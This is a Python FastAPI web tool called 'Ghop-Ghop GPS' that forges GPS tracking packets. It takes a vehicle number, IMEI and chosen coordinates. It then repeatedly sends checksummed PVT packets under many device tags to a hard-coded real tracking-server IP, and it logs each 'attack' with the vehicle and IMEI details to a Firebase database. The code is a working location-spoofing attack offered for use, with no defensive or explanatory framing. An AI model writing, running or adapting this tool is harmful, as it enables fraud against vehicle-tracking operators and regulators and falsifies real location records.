import threading
import time
import socket
import httpx
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI, BackgroundTasks, Request
from fastapi.responses import HTMLResponse

app = FastAPI()

# --- 1. CONFIGURATION ---
TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]
DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"
stop_event = threading.Event()
stop_event.set()
packet_count = 0

# --- 2. ENGINE LOGIC (Built-in for Speed) ---
def get_checksum(data):
    checksum = 0
    for char in data: checksum ^= ord(char)
    return hex(checksum).upper()[2:].zfill(2)

def sync_to_firebase(vno, data):
    try: httpx.patch(f"{DB_URL}/Data_Records/{vno.upper()}.json", json=data)
    except: pass

def handshake_worker(tag, imei, vno, lat, lon):
    global packet_count
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            s.connect(("103.151.104.148", 9999))
            pvt = f"PVT,{vno},{tag},{lat},{lon},0,0,{datetime.now().strftime('%d%m%y%H%M%S')},A"
            packet = f"${pvt}*{get_checksum(pvt)}\r\n"
            s.sendall(packet.encode())
            packet_count += 1
    except: pass

def nitro_firing_loop(v_up, i, lt, ln, t_up):
    target_tags = TAGS if t_up == "ALL" else [t_up]
    while not stop_event.is_set():
        for tag in target_tags:
            if stop_event.is_set(): break
            threading.Thread(target=handshake_worker, args=(tag, i, v_up, lt, ln), daemon=True).start()
            # Nitro Gap for Server Acceptance
            time.sleep(0.5 if t_up == "ALL" else 0.1)

# --- 3. API ROUTES ---
@app.get("/init")
async def init(v:str, i:str, lt:str, ln:str, t:str, background_tasks: BackgroundTasks):
    global packet_count
    if stop_event.is_set():
        v_up, t_up = v.upper().strip(), t.upper().strip()
        packet_count = 0
        stop_event.clear()
        
        # Syncing Last Attack to DB
        now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
        payload = {"Vehicle_No": v_up, "IMEI_No": i, "Lat": lt, "Lon": ln, "Last_Attack": now.strftime('%Y-%m-%d %H:%M:%S')}
        background_tasks.add_task(sync_to_firebase, v_up, payload)
        
        threading.Thread(target=nitro_firing_loop, args=(v_up, i, lt, ln, t_up), daemon=True).start()
    return {"ok": True}

@app.get("/status")
def status(): return {"c": packet_count, "f": not stop_event.is_set()}

@app.get("/stop")
def stop(): stop_event.set(); return {"ok": True}

@app.get("/fetch_data")
async def fetch_api(vno: str):
    async with httpx.AsyncClient() as client:
        res = await client.get(f"{DB_URL}/Data_Records/{vno.upper()}.json")
        data = res.json()
        if data: return {"found": True, "imei": data.get('IMEI_No'), "lat": data.get('Lat'), "lon": data.get('Lon')}
    return {"found": False}

# --- 4. NEON GRAPHICS (HTML/JS) ---
@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html><head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ghop-Ghop GPS</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        * { box-sizing: border-box; }
        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; min-height:100vh; overflow-x:hidden; }
        .dashboard { width:95%; max-width:440px; border:2px solid #0f0; padding:20px; background:rgba(0,10,0,0.95); border-radius:15px; box-shadow: 0 0 25px #0f0; margin-top:20px; }
        .conn-box { display: flex; justify-content: space-around; background: #111; padding: 8px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #333; font-size: 10px; }
        .dot { height: 8px; width: 8px; background-color: #333; border-radius: 50%; display: inline-block; margin-right: 4px; }
        .online { background-color: #0f0; box-shadow: 0 0 8px #0f0; }
        input, select { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:12px; margin-top:10px; outline:none; text-transform:uppercase; font-size:16px; border-radius:5px; }
        .chk-group { display: flex; align-items: center; gap: 12px; margin-top: 15px; color: #fff; font-size: 13px; }
        button { width:100%; padding:14px; margin-top:10px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; border-radius:5px; }
        .audit-box { display:flex; justify-content:space-between; background:rgba(0,40,0,0.5); border:1px solid #0f0; padding:8px; margin-top:10px; border-radius:5px; text-align:center; }
        #map { width:100%; height:200px; margin-top:15px; border:1px solid #0f0; border-radius:10px; }
    </style></head><body>
    <div class="dashboard">
        <div class="conn-box"><span><span class="dot online"></span>MAIN.PY</span><span><span class="dot online" id="e_dot"></span>ENGINE</span></div>
        <div class="audit-box"><div>OK<b id="a_ok">0</b></div><div>TOTAL<b id="a_total">0</b></div></div>
        <input type="text" id="v" onblur="smartFetch()" placeholder="VEHICLE NUMBER">
        <input type="text" id="i" placeholder="IMEI">
        <select id="tagSel"><option value="ALL">ALL TAGS (MULTI-STREAM)</option>""" + "".join([f'<option value="{t}">{t}</option>' for t in TAGS]) + """</select>
        <div class="chk-group"><input type="checkbox" id="useDef"> <label>Use Profile Default Location</label></div>
        <div style="display:flex;gap:5px;"><input type="text" id="lt" placeholder="LAT"><input type="text" id="ln" placeholder="LON"></div>
        <button onclick="getLocation()" style="font-size:11px;border-style:dashed;">[[ GET CURRENT LOCATION ]]</button>
        <button onclick="st()" id="startBtn" style="background:#0f0;color:#000;font-size:18px;">START INJECTION</button>
        <button onclick="sp()" style="color:red;border-color:red;">ABORT</button>
        <button onclick="resetSystem()" style="color:yellow;border-color:yellow;font-size:11px;">RESET SYSTEM</button>
        <div id="map"></div>
        <div style="display:flex;justify-content:space-between;margin-top:15px;font-size:14px;"><span>SENT: <b id="c">0</b></span><span id="st_text" style="color:lime">IDLE</span></div>
    </div>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        let map, marker;
        function initMap() { map = L.map('map').setView([24.91, 83.79], 13); L.tileLayer('https://{s}.tile.openstreetmap.fr/hot/{z}/{x}/{y}.png').addTo(map); marker = L.marker([24.91, 83.79]).addTo(map); }
        initMap();
        function getLocation() { navigator.geolocation.getCurrentPosition(p=>{ document.getElementById('lt').value = p.coords.latitude.toFixed(7); document.getElementById('ln').value = p.coords.longitude.toFixed(7); map.setView([p.coords.latitude, p.coords.longitude], 15); marker.setLatLng([p.coords.latitude, p.coords.longitude]); }); }
        function resetSystem() { document.getElementById('v').value=''; document.getElementById('i').value=''; document.getElementById('lt').value=''; document.getElementById('ln').value=''; document.getElementById('c').innerText='0'; }
        setInterval(() => { fetch('/status').then(r=>r.json()).then(d=> { 
            document.getElementById('c').innerText = d.c; document.getElementById('a_total').innerText = d.c; 
            if(d.f) { document.getElementById('st_text').innerText = 'FIRING'; document.getElementById('st_text').style.color = 'red'; }
            else { document.getElementById('st_text').innerText = 'IDLE'; document.getElementById('st_text').style.color = 'lime'; }
        }); }, 1000);
        async function smartFetch() { 
            let v = document.getElementById('v').value.toUpperCase().trim(); if(!v) return; 
            let res = await fetch(`/fetch_data?vno=${v}`); let d = await res.json(); 
            if(d.found){ 
                document.getElementById('i').value = d.imei; 
                let lat = document.getElementById('useDef').checked ? 24.91 : d.lat;
                let lon = document.getElementById('useDef').checked ? 83.79 : d.lon;
                document.getElementById('lt').value = lat; document.getElementById('ln').value = lon; 
                map.setView([lat, lon], 15); marker.setLatLng([lat, lon]);
            } 
        }
        function st() { let v=document.getElementById('v').value, i=document.getElementById('i').value, lt=document.getElementById('lt').value, ln=document.getElementById('ln').value, t=document.getElementById('tagSel').value; fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}&t=${t}`); }
        function sp() { fetch('/stop'); }
    </script></body></html>
    """
